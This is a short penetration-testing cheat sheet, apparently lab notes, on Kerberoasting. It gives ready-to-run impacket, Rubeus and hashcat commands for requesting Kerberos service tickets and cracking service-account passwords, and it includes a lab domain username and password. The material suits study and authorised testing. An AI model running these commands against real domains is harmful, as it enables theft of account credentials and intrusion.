# Kerberoasting

The service ticket is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as [_Kerberoasting_](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/).

## Linux

Enumerates SPN accounts and requests their Kerberos service tickets:

{% code overflow="wrap" %}
```
sudo impacket-GetUserSPNs hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.219.122
```
{% endcode %}

* `hutch.offsec/fmcsorley:CrabSharkJellyfish192`\
  The domain, username, and password used to authenticate to the domain controller.
* `-dc-ip 192.168.219.122`\
  Specifies the IP address of the domain controller to query.

Request TGS and output hashes for cracking:

{% code overflow="wrap" %}
```sh
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
{% endcode %}

* &#x20;**-dc-ip:** IP of the domain controller
* **-request:** obtain the TGS and output them in a compatible format for Hashcat

## Windows

Kerberoasting using Rubeus:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

* **kerberoast:** launch kerberoasting technique&#x20;
* **/outfile:** file to store the resulting TGS-REP hash

As we execute Rubeus as an **authenticated domain user**, the tool will identify all SPNs linked with a domain user.

## Crack the hash

Identify hash mode for hashcat:

```sh
hashcat --help | grep -i "Kerberos"
```

Crack the hash:&#x20;

{% code overflow="wrap" %}
```sh
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}



